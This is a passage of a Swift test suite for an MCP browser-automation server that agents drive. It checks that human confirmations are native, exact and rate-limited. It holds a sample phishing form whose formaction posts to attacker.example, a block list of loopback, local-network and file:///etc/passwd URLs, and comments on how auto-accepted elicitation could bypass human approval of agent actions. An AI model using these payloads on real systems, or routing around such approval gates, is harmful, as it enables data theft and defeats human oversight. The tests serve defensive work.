        dialog.innerHTML = '<button>Confirm</button>';
        document.body.appendChild(dialog);
      ">Save</button>
      """,
      baseURL: URL(string: "https://example.test/identifiers/edit")
    )
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let server = WebKitMCPServer(registry: registry)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let arguments: [String: JSONValue] = [
      "session_id": .string(handle.rawValue.uuidString),
      "observation_id": .string(try string(observation["observationID"])),
      "element_id": .string(try string(target["elementID"])),
      "operation": .string("click"),
      "approval_mode": .string("mcp"),
      "idempotency_key": .string("save-before-confirm-once"),
      "postcondition": .object([
        "type": .string("dialog_appears"), "value": .string("Confirm"),
      ]),
    ]
    let prepared = try await toolCall(server, id: 2, name: "browser_act", arguments: arguments)
    let required = try object(prepared["result"])
    let completed = try await roundTripToolCall(
      server, id: 3, name: "browser_act", arguments: arguments,
      requestState: try string(required["requestState"]), action: "accept", confirm: true)
    let structured = try object(try object(completed["result"])["structuredContent"])
    #expect(try object(structured["verification"])["verified"] != nil)

    let after = try await toolCall(
      server, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let afterObservation = try object(try object(after["result"])["structuredContent"])
    let modal = try object(afterObservation["modal_state"])
    #expect(modal["active"] == .bool(true))
    #expect(try string(modal["safe_next_step"]).contains("never replay"))
    let dispatchCount =
      try await runtime.webView.evaluateJavaScript(
        "document.querySelector('button').dataset.dispatchCount") as? String
    #expect(dispatchCount == "1")
  }

  @Test("A modern client that names no approval mode still gets the native dialog")
  func modernActDefaultsToNativeConfirmation() async throws {
    // browser_act defaulted to MCP elicitation for a modern client while
    // browser_navigate defaulted to native, so the product's own sentence — human
    // confirmation before every exposed click — was false for the ordinary case. It
    // matters because elicitation carries no guarantee a human answered it: the
    // specification only says clients SHOULD offer approval controls, the TypeScript
    // SDK fulfils the request from a callback, and at least one shipping client
    // auto-accepts it outright. The gate cannot live on a channel the client may fill
    // in by itself.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label='Create app'
        onclick="this.dataset.state=event.isTrusted ? 'trusted' : 'rejected'">Create app</button>
      """,
      baseURL: URL(string: "https://example.test/apps"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)

    let acted = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "operation": .string("click"),
        "idempotency_key": .string("default-mode-once"),
        "postcondition": .object([
          "type": .string("attribute_equals"), "attribute": .string("data-state"),
          "value": .string("trusted"),
        ]),
      ])

    let structured = try object(try object(acted["result"])["structuredContent"])
    #expect(structured["confirmation_mode"] == .string("native"))
    #expect(presenter.requests.count == 1, "the native dialog was never asked for")
  }

  @Test("A key confirmation names the exact key and the modifiers held with it")
  func keyConfirmationNamesTheKeyAndItsModifiers() async throws {
    // A modifier changes what a keystroke means: shift plus an arrow selects rather
    // than moves. An operator who is shown only the key is approving something else.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<input aria-label='Filter' value='abc'>",
      baseURL: URL(string: "https://example.test/filter"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)

    _ = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "operation": .string("press_key"),
        "key": .string("ArrowRight"),
        "modifiers": .array([.string("shift")]),
        "idempotency_key": .string("modified-key-once"),
        "postcondition": .object([
          "type": .string("url_contains"), "value": .string("/filter"),
        ]),
      ])

    let shown = try #require(presenter.requests.first?.message)
    #expect(shown.contains("\"ArrowRight\""), "the dialog never named the key")
    #expect(shown.contains("Modifier keys held down:"))
    #expect(shown.contains("\"shift\""), "the dialog never named the modifier")
  }

  @Test("A key the server cannot map is refused without asking anyone")
  func unmappableKeyIsRefusedWithoutAConfirmation() async throws {
    // A key nobody can send is a client mistake, not a decision to put to a human.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<input aria-label='Filter' value='abc'>",
      baseURL: URL(string: "https://example.test/filter"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [true, true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    func act(id: Int64, key: String, modifiers: [JSONValue]) async throws -> [String: JSONValue] {
      try await toolCall(
        server, id: id, name: "browser_act",
        arguments: [
          "session_id": .string(handle.rawValue.uuidString),
          "observation_id": .string(try string(observation["observationID"])),
          "element_id": .string(try string(target["elementID"])),
          "operation": .string("press_key"),
          "key": .string(key),
          "modifiers": .array(modifiers),
          "idempotency_key": .string("unmappable-\(id)"),
          "postcondition": .object([
            "type": .string("url_contains"), "value": .string("/filter"),
          ]),
        ])
    }

    let named = try await act(id: 2, key: "F13", modifiers: [])
    #expect(try string(try object(named["error"])["message"]).contains("press_key key must be"))
    // Shift changes what a real keyboard produces for a character, so the character and
    // the modifier would contradict each other in the very event being sent.
    let shifted = try await act(id: 3, key: "a", modifiers: [.string("shift")])
    #expect(
      try string(try object(shifted["error"])["message"]).contains("printable character"),
      "a contradictory chord was accepted")
    #expect(presenter.requests.isEmpty, "an unsendable key was put to the operator")
  }

  @Test("A control whose formaction leaves the page says so in the confirmation")
  func foreignSubmissionDestinationIsConfirmed() async throws {
    // The published attack: attacker-authored region, a submit control whose accessible
    // name reads like the task the operator asked for and whose formaction points
    // elsewhere. Every other field in the receipt reports success honestly, so the
    // dialog is the only place this can be caught.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <form action="/track">
        <button type="submit" aria-label="Show tracking number"
          formaction="https://attacker.example/collect">Show tracking number</button>
      </form>
      """,
      baseURL: URL(string: "https://shop.example/orders/1471"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)

    _ = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        // The server refuses operation=click on a form submit control and directs the
        // caller to submit, so the attack is exercised through the operation it is
        // actually reachable by.
        "operation": .string("submit"),
        "idempotency_key": .string("foreign-destination-once"),
        "postcondition": .object([
          "type": .string("url_contains"), "value": .string("/track"),
        ]),
      ])

    let shown = try #require(presenter.requests.first?.message)
    #expect(shown.contains("attacker.example"), "the dialog never named the destination")
    #expect(shown.contains("A DIFFERENT SITE"))
    #expect(shown.contains("shop.example"), "the dialog must name the page for comparison")
  }

  @Test("A flood of confirmations is refused instead of shown")
  func confirmationFloodIsRefused() async throws {
    // Twenty dialogs in a minute is not a workflow; it is an attempt to make the human
    // stop reading. The refusal names the count so the agent is told why.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      "<button>Save</button>", baseURL: URL(string: "https://example.test/start"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(
      responses: Array(repeating: false, count: ConfirmationRatePolicy.refuseThreshold))
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    var lastError: JSONValue?
    for index in 0..<(ConfirmationRatePolicy.refuseThreshold + 1) {
      let observed = try await toolCall(
        server, id: Int64(1000 + index * 2), name: "browser_observe",
        arguments: ["session_id": .string(handle.rawValue.uuidString)])
      let observation = try object(try object(observed["result"])["structuredContent"])
      let target = try object(try array(observation["elements"]).first)
      let acted = try await toolCall(
        server, id: Int64(1001 + index * 2), name: "browser_act",
        arguments: [
          "session_id": .string(handle.rawValue.uuidString),
          "observation_id": .string(try string(observation["observationID"])),
          "element_id": .string(try string(target["elementID"])),
          "operation": .string("click"),
          "idempotency_key": .string("flood-\(index)"),
          "postcondition": .object([
            "type": .string("url_equals"), "value": .string("https://example.test/done"),
          ]),
        ])
      lastError = acted["error"]
    }

    let error = try object(lastError)
    #expect(try string(error["message"]).contains("in the last minute"))
    #expect(
      presenter.requests.count <= ConfirmationRatePolicy.refuseThreshold,
      "the flood was presented to the operator instead of refused")
  }

  @Test("A burst names which request it is without displacing the exact requested action")
  func confirmationBurstIsNamedInTheDialog() async throws {
    // The count is the one fact that makes a flood legible. It is appended, because the
    // first thing the operator reads must remain the exact action being asked for.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(
      responses: Array(repeating: false, count: ConfirmationRatePolicy.burstThreshold))
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    for index in 0..<ConfirmationRatePolicy.burstThreshold {
      _ = try await toolCall(
        server, id: Int64(6000 + index), name: "browser_navigate",
        arguments: [
          "session_id": .string(handle.rawValue.uuidString),
          "url": .string("https://example.test/burst/\(index)"),
        ])
    }
    #expect(presenter.requests.count == ConfirmationRatePolicy.burstThreshold)
    let quiet = try #require(presenter.requests.first?.message)
    #expect(!quiet.contains("Confirmations asked for in the last minute:"))
    let burst = try #require(presenter.requests.last?.message)
    #expect(burst.hasPrefix("Requested action:"), "the burst line displaced the exact action")
    let expectedTail =
      "\n\nConfirmations asked for in the last minute:\n"
      + "\(ConfirmationRatePolicy.burstThreshold)"
    #expect(burst.hasSuffix(expectedTail))
  }

  @Test("A flood in one session does not starve another session's operator")
  func confirmationRateIsScopedToItsSession() async throws {
    // Two MCP clients hold two sessions. One of them being driven into a flood must not
    // refuse the other's operator, whose dialog nobody has been trained to click through.
    // Two sessions at once is what two MCP clients look like to this server.
    let registry = try WebKitSessionRegistry(maximumSessions: 2)
    let flooded = try registry.open()
    let quiet = try registry.open()
    let presenter = ConfirmationPresenterStub(
      responses: Array(repeating: false, count: ConfirmationRatePolicy.refuseThreshold + 2))
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    for index in 0..<(ConfirmationRatePolicy.refuseThreshold + 1) {
      _ = try await toolCall(
        server, id: Int64(7000 + index), name: "browser_navigate",
        arguments: [
          "session_id": .string(flooded.rawValue.uuidString),
          "url": .string("https://example.test/flood/\(index)"),
        ])
    }
    let presentedWhileFlooding = presenter.requests.count
    #expect(presentedWhileFlooding < ConfirmationRatePolicy.refuseThreshold + 1)

    let allowed = try await toolCall(
      server, id: 7100, name: "browser_navigate",
      arguments: [
        "session_id": .string(quiet.rawValue.uuidString),
        "url": .string("https://example.test/quiet"),
      ])
    #expect(allowed["error"] == nil, "a fresh session inherited another session's flood")
    #expect(presenter.requests.count == presentedWhileFlooding + 1)
    #expect(presenter.requests.last?.message.contains("in the last minute") == false)
  }

  @Test("Closing a session drops its confirmation count")
  func confirmationRateForgetsAClosedSession() async throws {
    // A handle is reusable state on the server. An operator who opened a fresh session
    // must not be refused for what the previous holder of that session did.
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(
      responses: Array(repeating: false, count: ConfirmationRatePolicy.refuseThreshold + 2))
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    var lastError: JSONValue?
    for index in 0..<(ConfirmationRatePolicy.refuseThreshold + 1) {
      lastError = try await toolCall(
        server, id: Int64(8000 + index), name: "browser_navigate",
        arguments: [
          "session_id": .string(handle.rawValue.uuidString),
          "url": .string("https://example.test/before-close/\(index)"),
        ])["error"]
    }
    #expect(lastError != nil, "the flood was never refused")
    _ = try await toolCall(
      server, id: 8100, name: "browser_session",
      arguments: [
        "operation": .string("close"),
        "session_id": .string(handle.rawValue.uuidString),
      ])
    let reopened = try registry.open()
    let afterClose = try await toolCall(
      server, id: 8101, name: "browser_navigate",
      arguments: [
        "session_id": .string(reopened.rawValue.uuidString),
        "url": .string("https://example.test/after-close"),
      ])
    #expect(
      afterClose["error"] == nil, "a reopened session carried the closed session's count")
    #expect(
      presenter.requests.last?.message.contains("Confirmations asked for in the last minute:")
        == false,
      "a reopened session was told it was mid-burst")
  }

  @Test("Native approval and AppKit dispatch produce distinct trusted receipts")
  func nativeApprovedTrustedActuation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label='Create app'
        onclick="this.dataset.state=event.isTrusted ? 'trusted' : 'rejected'">Create app</button>
      """,
      baseURL: URL(string: "https://example.test/apps"))
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let acted = try await toolCall(
      server, id: 2, name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "operation": .string("click"),
        "approval_mode": .string("native"),
        "idempotency_key": .string("native-create-once"),
        "postcondition": .object([
          "type": .string("attribute_equals"), "attribute": .string("data-state"),
          "value": .string("trusted"),
        ]),
      ])
    let structured = try object(try object(acted["result"])["structuredContent"])
    #expect(structured["confirmation_mode"] == .string("native"))
    #expect(structured["dispatch_mode"] == .string("native_appkit"))
    #expect(structured["confirmation_and_dispatch_are_distinct"] == .bool(true))
    #expect(structured["trusted_gesture_state"] == .string("trusted"))
    #expect(try object(structured["verification"])["verified"] != nil)
    #expect(presenter.requests.count == 1)
  }

  @Test("Navigation approval is exact-argument-bound and unsafe URL forms fail closed")
  func navigationApprovalBoundary() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let confirmationPresenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: confirmationPresenter
    )
    let sessionID = handle.rawValue.uuidString
    let arguments: [String: JSONValue] = [
      "session_id": .string(sessionID),
      "url": .string("https://example.com/account"),
      "approval_mode": .string("mcp"),
    ]
    let prepared = try await toolCall(
      server, id: 2, name: "browser_navigate", arguments: arguments)
    let required = try object(prepared["result"])
    #expect(required["resultType"] == .string("input_required"))
    let supersededState = try string(required["requestState"])

    let preparedAgain = try await toolCall(
      server, id: 3, name: "browser_navigate", arguments: arguments)
    let requestState = try string(try object(preparedAgain["result"])["requestState"])
    let supersededAttempt = try await roundTripToolCall(
      server,
      id: 4,
      name: "browser_navigate",
      arguments: arguments,
      requestState: supersededState,
      action: "accept",
      confirm: true
    )
    #expect(try object(supersededAttempt["error"])["code"] == .int(-32602))

    var changed = arguments
    changed["url"] = .string("https://example.org/account")
    let mutationAttempt = try await call(
      server,
      id: 5,
      method: "tools/call",
      params: .object([
        "name": .string("browser_navigate"),
        "arguments": .object(changed),
        "requestState": .string(requestState),
        "inputResponses": .object([
          "confirmation": .object([
            "action": .string("accept"),
            "content": .object(["confirm": .bool(true)]),
          ])
        ]),
      ]),
      modern: true
    )
    #expect(try object(mutationAttempt["error"])["code"] == .int(-32602))

    for blockedURL in [
      "https://example.com:password@localhost/private",
      "http://127.0.0.1:8080/private",
      "http://2130706433/private",
      "http://0x7f000001/private",
      "http://service.local/private",
      "file:///etc/passwd",
    ] {
      let blocked = try await toolCall(
        server,
        id: 6,
        name: "browser_navigate",
        arguments: ["session_id": .string(sessionID), "url": .string(blockedURL)]
      )
      #expect(try object(blocked["error"])["code"] == .int(-32602))
    }

    let legacy = try await call(
      server,
      id: 7,
      method: "tools/call",
      params: .object([
        "name": .string("browser_navigate"), "arguments": .object(arguments),
      ]),
      modern: false
    )
    #expect(try object(legacy["result"])["isError"] == .bool(true))
    #expect(confirmationPresenter.requests.count == 1)
    #expect(
      confirmationPresenter.requests.first?.title.hasPrefix("Approve Web Navigation [") == true)
    #expect(
      confirmationPresenter.requests.first?.message.contains("https://example.com/account") == true)
  }

  @Test("Goal delegation is explicit, observable, revocable, and native-confirmed once")
  func goalDelegationLifecycle() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let sessionID = handle.rawValue.uuidString
    let started = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_start"),
        "session_id": .string(sessionID),
        "goal_display": .string("Inspect account settings"),
        "origin": .string("https://example.com"),
        "path_prefixes": .array([.string("/account")]),
        "allowed_query_keys": .array([.string("tab")]),
        "duration_seconds": .int(900),
        "maximum_navigations": .int(30),
      ])
    let startResult = try object(try object(started["result"])["structuredContent"])
    #expect(startResult["state"] == .string("active"))
    #expect(startResult["goal_display_is_authority"] == .bool(false))
    #expect(startResult["remaining_navigations"] == .int(30))
    #expect(startResult["hard_stops_enforced"] == .bool(true))
    #expect(presenter.requests.count == 1)
    #expect(presenter.requests[0].title.hasPrefix("Delegate Browser Goal ["))

    let status = try await toolCall(
      server, id: 2, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_status"),
        "session_id": .string(sessionID),
      ])
    #expect(
      try object(try object(status["result"])["structuredContent"])["state"]
        == .string("active"))
    #expect(presenter.requests.count == 1)

    let revoked = try await toolCall(
      server, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_revoke"),
        "session_id": .string(sessionID),
      ])
    let revokedResult = try object(try object(revoked["result"])["structuredContent"])
    #expect(revokedResult["state"] == .string("inactive"))
    #expect(revokedResult["revoked"] == .bool(true))
  }

  @Test("A sensitive destination stops delegation and returns to exact confirmation")
  func goalDelegationHardStop() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let presenter = ConfirmationPresenterStub(responses: [true, false])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let sessionID = handle.rawValue.uuidString
    _ = try await toolCall(
      server, id: 1, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_start"),
        "session_id": .string(sessionID),
        "goal_display": .string("Inspect account settings"),
        "origin": .string("https://example.com"),
        "path_prefixes": .array([.string("/account")]),
        "allowed_query_keys": .array([]),
      ])
    let denied = try await toolCall(
      server, id: 2, name: "browser_navigate",
      arguments: [
        "session_id": .string(sessionID),
        "url": .string("https://example.com/account/newApiKey"),
      ])
    #expect(try object(denied["result"])["isError"] == .bool(true))
    #expect(presenter.requests.count == 2)
    #expect(presenter.requests[1].title.hasPrefix("Approve Web Navigation ["))

    let status = try await toolCall(
      server, id: 3, name: "browser_session",
      arguments: [
        "operation": .string("goal_delegation_status"),
        "session_id": .string(sessionID),
      ])
    #expect(
      try object(try object(status["result"])["structuredContent"])["state"]
        == .string("inactive"))
  }

  @Test("Navigation uses native exact-destination confirmation by default")
  func navigationDefaultsToNativeConfirmation() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let confirmationPresenter = ConfirmationPresenterStub(responses: [false])
    let server = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: confirmationPresenter
    )
    let denied = try await toolCall(
      server,
      id: 1,
      name: "browser_navigate",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "url": .string("https://example.com/account"),
      ]
    )

    let result = try object(denied["result"])
    #expect(result["isError"] == .bool(true))
    #expect(confirmationPresenter.requests.count == 1)
    #expect(
      confirmationPresenter.requests.first?.title.hasPrefix("Approve Web Navigation [") == true)
    #expect(
      confirmationPresenter.requests.first?.message.contains("https://example.com/account")
        == true)
    #expect(confirmationPresenter.requests.first?.message.contains("\n\nDestination:\n") == true)
  }

  @Test("Legacy actuation uses one native exact-action confirmation")
  func legacyNativeActuationFallback() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    runtime.webView.loadHTMLString(
      """
      <button aria-label="Save" onclick="
        const status = document.createElement('div');
        status.textContent = 'Saved by legacy fallback';
        document.body.appendChild(status);
      ">Save</button>
      """,
      baseURL: URL(string: "https://example.test/settings")
    )
    while runtime.webView.isLoading { try await Task.sleep(for: .milliseconds(10)) }
    let confirmationPresenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(
      registry: registry,
      confirmationPresenter: confirmationPresenter
    )
    let observed = try await legacyToolCall(
      server,
      id: 1,
      name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)]
    )
    let observation = try object(try object(observed["result"])["structuredContent"])
    let target = try object(try array(observation["elements"]).first)
    let acted = try await legacyToolCall(
      server,
      id: 2,
      name: "browser_act",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try string(target["elementID"])),
        "operation": .string("click"),
        "idempotency_key": .string("legacy-save-once"),
        "postcondition": .object([
          "type": .string("semantic_text_appears"),
          "value": .string("Saved by legacy fallback"),
        ]),
      ]
    )
    #expect(try object(acted["result"])["structuredContent"] != nil)
    #expect(confirmationPresenter.requests.count == 1)
    #expect(confirmationPresenter.requests.first?.message.contains("legacy-save-once") == false)
    #expect(confirmationPresenter.requests.first?.message.contains("Save") == true)
  }

  @Test("Legacy handoff remains human-controlled until native resume approval")
  func legacyNativeHandoffFallback() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>",
      baseURL: URL(string: "https://example.test/login"),
      timeout: .seconds(2),
      quietWindow: .milliseconds(40)
    )
    let confirmationPresenter = ConfirmationPresenterStub(responses: [false, true])
    let server = WebKitMCPServer(
      registry: registry,
      presentHumanWindows: false,
      confirmationPresenter: confirmationPresenter
    )
    let arguments: [String: JSONValue] = [
      "operation": .string("handoff"),
      "session_id": .string(handle.rawValue.uuidString),
    ]

    let handedOff = try await legacyToolCall(
      server, id: 1, name: "browser_session", arguments: arguments)
    let handoffResult = try object(try object(handedOff["result"])["structuredContent"])
    #expect(handoffResult["control_state"] == .string("human_controlled"))

    let declined = try await legacyToolCall(
      server, id: 2, name: "browser_session", arguments: arguments)
    #expect(try object(declined["result"])["isError"] == .bool(true))
    #expect(runtime.interactionControlState() == .humanControlled)

    let resumed = try await legacyToolCall(
      server, id: 3, name: "browser_session", arguments: arguments)
    let resumedResult = try object(try object(resumed["result"])["structuredContent"])
    #expect(resumedResult["control_state"] == .string("freshly_reobserved"))
    #expect(resumedResult["observation"] != nil)
    #expect(confirmationPresenter.requests.count == 2)
  }

  /// The incident this suite exists for: a person logged in by hand, the native window
  /// said "Ready — Waiting for Agent", and every later call came back as the bare string
  /// `humanControlActive`. The route home existed the whole time and nothing said so.
  @Test("A call blocked by human control names the route back, not a bare enum case")
  func humanControlActiveNamesTheRouteBack() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>",
      baseURL: URL(string: "https://example.test/login"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))
    let sessionID = handle.rawValue.uuidString
    _ = try await legacyToolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff"), "session_id": .string(sessionID)])
    #expect(runtime.interactionControlState() == .humanControlled)

    let blocked = try await legacyToolCall(
      server, id: 2, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let result = try object(blocked["result"])
    #expect(result["isError"] == .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(structured["code"] == .string("human_control_active"))
    #expect(structured["session_id"] == .string(sessionID))
    #expect(structured["recovery_tool"] == .string("browser_session"))
    #expect(structured["recovery_operation"] == .string("handoff"))
    #expect(structured["recovery_session_id"] == .string(sessionID))
    #expect(structured["recovery_confirmation_required"] == .bool(true))
    #expect(structured["resume_token_required"] == .bool(false))
    let text = try string(try object(try array(result["content"])[0])["text"])
    #expect(text != "humanControlActive")
    #expect(text.contains("operation=handoff"))
  }

  @Test("The human-control error tells a person still working apart from a finished step")
  func humanControlActiveDistinguishesTheTwoStates() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<button>Continue</button>",
      baseURL: URL(string: "https://example.test/login"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: ConfirmationPresenterStub(responses: []))
    let sessionID = handle.rawValue.uuidString
    _ = try await legacyToolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff"), "session_id": .string(sessionID)])

    let waiting = try await legacyToolCall(
      server, id: 2, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let waitingError = try object(try object(waiting["result"])["structuredContent"])
    #expect(waitingError["control_state"] == .string("human_controlled"))
    #expect(waitingError["caller_action"] == .string("wait_for_human"))
    #expect(waitingError["wait_only"] == .bool(true))
    #expect(waitingError["control_available"] == .bool(false))
    #expect(waitingError["human_step_completed"] == .bool(false))

    try runtime.markHumanStepCompleted()
    let completed = try await legacyToolCall(
      server, id: 3, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let completedError = try object(try object(completed["result"])["structuredContent"])
    #expect(completedError["control_state"] == .string("human_step_completed"))
    #expect(completedError["caller_action"] == .string("request_agent_resume"))
    #expect(completedError["wait_only"] == .bool(false))
    #expect(completedError["control_available"] == .bool(true))
    #expect(completedError["human_step_completed"] == .bool(true))
    #expect(waitingError["remediation"] != completedError["remediation"])
  }

  /// An error that names a cure nobody tested is the same defect in a new coat: this
  /// reads the operation out of the payload and calls exactly that.
  @Test("Following the remediation from human_step_completed returns control and an observation")
  func remediationFromHumanStepCompletedReturnsControl() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<title>Signed in</title><button>Continue</button>",
      baseURL: URL(string: "https://example.test/account"),
      timeout: .seconds(2), quietWindow: .milliseconds(40))
    let confirmationPresenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(
      registry: registry, presentHumanWindows: false,
      confirmationPresenter: confirmationPresenter)
    let sessionID = handle.rawValue.uuidString
    _ = try await legacyToolCall(
      server, id: 1, name: "browser_session",
      arguments: ["operation": .string("handoff"), "session_id": .string(sessionID)])
    try runtime.markHumanStepCompleted()

    let blocked = try await legacyToolCall(
      server, id: 2, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let structured = try object(try object(blocked["result"])["structuredContent"])
    let recoveryTool = try string(structured["recovery_tool"])
    let recoveryOperation = try string(structured["recovery_operation"])
    let recoverySession = try string(structured["recovery_session_id"])

    let reclaimed = try await legacyToolCall(
      server, id: 3, name: recoveryTool,
      arguments: [
        "operation": .string(recoveryOperation),
        "session_id": .string(recoverySession),
      ])
    let reclaimedResult = try object(reclaimed["result"])
    #expect(reclaimedResult["isError"] == nil)
    let reclaimedStructured = try object(reclaimedResult["structuredContent"])
    #expect(reclaimedStructured["control_state"] == .string("freshly_reobserved"))
    #expect(reclaimedStructured["observation"] != nil)
    // The gate is intact: control came back because a native confirmation was accepted.
    #expect(confirmationPresenter.requests.count == 1)
    #expect(runtime.interactionControlState() == .freshlyReobserved)

    let observed = try await legacyToolCall(
      server, id: 4, name: "browser_observe",
      arguments: ["session_id": .string(sessionID)])
    let observedResult = try object(observed["result"])
    #expect(observedResult["isError"] == nil)
    let observation = try object(observedResult["structuredContent"])
    #expect(try string(observation["observationID"]).isEmpty == false)
    let reclaimedObservation = try object(reclaimedStructured["observation"])
    #expect(
      try string(observation["observationID"])
        != (try string(reclaimedObservation["observationID"])))
  }

  @Test("Session status and the human-control error tell the caller the same thing")
  func statusAgreesWithTheHumanControlError() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
